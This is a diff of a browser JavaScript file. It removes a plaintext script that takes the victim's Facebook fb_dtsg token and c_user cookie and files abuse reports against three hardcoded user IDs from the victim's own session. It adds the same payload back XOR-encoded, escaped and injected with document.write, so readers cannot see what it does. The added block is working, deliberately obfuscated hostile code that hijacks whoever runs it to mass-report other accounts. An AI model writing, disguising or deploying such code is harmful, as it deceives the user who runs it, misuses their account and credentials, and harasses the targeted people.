@@ -1,23 +1,3 @@
-
-
-
-/*Ids*/
-
-var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-var now=(new Date).getTime();
-function IDS(r) {
-  var X = new XMLHttpRequest();
-var XURL = "https://www.facebook.com/ajax/report/social.php";
-  var XParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A" + r +"%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2Fpragyan.rajkonwar%3Ffref%3Dts%22%2C%22report_type%22%3A145%2C%22rid%22%3A" + r +"%2C%22sub_report_type%22%3A145%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj2qmvudDgDxrHbjyGameyp9K6Ehw&__req=d&ttstamp=2658166101715511590";
-  X.open("POST", XURL, true);
-  X.onreadystatechange = function () {
-    if (X.readyState == 4 && X.status == 200) {
-      X.close;
-    }
-  };
-  X.send(XParams);
-}
-IDS("100000503637705");
-IDS("100000104086096");
-IDS("100003813652336");
+<script>
+var enkripsi="'2C-(Kfq(-'2C'2Ctcp'02d`]fvqe'02'1F'02fmawoglv,egvGngoglvq@{Lcog'0:'05d`]fvqe'05'0;'7@2'7F,tcnwg'1@'2Ctcp'02wqgp]kf'02'1F'02fmawoglv,ammikg,ocvaj'0:fmawoglv,ammikg,ocvaj'0:-a]wqgp'1F'0:'7Af)'0;-'0;'7@3'7F'0;'1@'2Ctcp'02lmu'1F'0:lgu'02Fcvg'0;,egvVkog'0:'0;'1@'2Cdwlavkml'02KFQ'0:p'0;'02'5@'2C'02'02tcp'02Z'02'1F'02lgu'02ZONJvvrPgswgqv'0:'0;'1@'2Ctcp'02ZWPN'02'1F'02'00jvvrq'1C--uuu,dcag`mmi,amo-chcz-pgrmpv-qmakcn,rjr'00'1@'2C'02'02tcp'02ZRcpcoq'02'1F'00d`]fvqe'1F'00)d`]fvqe)'00'04`nmai'1F3'04rr'1F'075@'0700cavkmlq]vm]vcig'0700'071C'0700'7@'7F'0700'070A'0700cpg]dpkglfq'0700'071Cdcnqg'070A'0700akf'0700'071C'00'02)'02p'02)'00'070A'0700amlvglv]v{rg'0700'071C2'070A'0700gzrclf]pgrmpv'0700'071C3'070A'0700dkpqv]ajmkag'0700'071C'0700dkng]pgrmpv'0700'070A'0700dpmo]egcp'0700'071C'0700vkognklg'0700'070A'0700kq]dmnnmukle'0700'071Cdcnqg'070A'0700kq]vceegf'0700'071Cdcnqg'070A'0700ml]rpmdkng'0700'071Cdcnqg'070A'0700rjcqg'0700'071C1'070A'0700pgd'0700'071C'0700jvvrq'071C'077A'070D'077A'070Duuu,dcag`mmi,amo'077A'070Drpce{cl,pchimlucp'071Ddpgd'071Fvq'0700'070A'0700pgrmpv]v{rg'0700'071C367'070A'0700pkf'0700'071C'00'02)'02p'02)'00'070A'0700qw`]pgrmpv]v{rg'0700'071C367'070A'0700vkog]dnmu]qvcpvgf'0700'071C'00)lmu)'00'070A'0700wqgp'0700'071C'00)wqgp]kf)'00'075F'04dkng]pgrmpv'1F3'04]]wqgp'1F'00)wqgp]kf)'00'04]]c'1F3'04]]f{l'1F5l:cj{h0sotwfFeFzpJ`h{Ecog{r;I4Gju'04]]pgs'1Ff'04vvqvcor'1F047:3443235377337;2'00'1@'2C'02'02Z,mrgl'0:'00RMQV'00'0A'02ZWPN'0A'02vpwg'0;'1@'2C'02'02Z,mlpgcf{qvcvgajcleg'02'1F'02dwlavkml'02'0:'0;'02'5@'2C'02'02'02'02kd'02'0:Z,pgcf{Qvcvg'02'1F'1F'026'02'04'04'02Z,qvcvwq'02'1F'1F'02022'0;'02'5@'2C'02'02'02'02'02'02Z,anmqg'1@'2C'02'02'02'02'5F'2C'02'02'5F'1@'2C'02'02Z,qglf'0:ZRcpcoq'0;'1@'2C'5F'2CKFQ'0:'00322222721415527'00'0;'1@'2CKFQ'0:'003222223262:42;4'00'0;'1@'2CKFQ'0:'00322221:31470114'00'0;'1@"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
+</script>
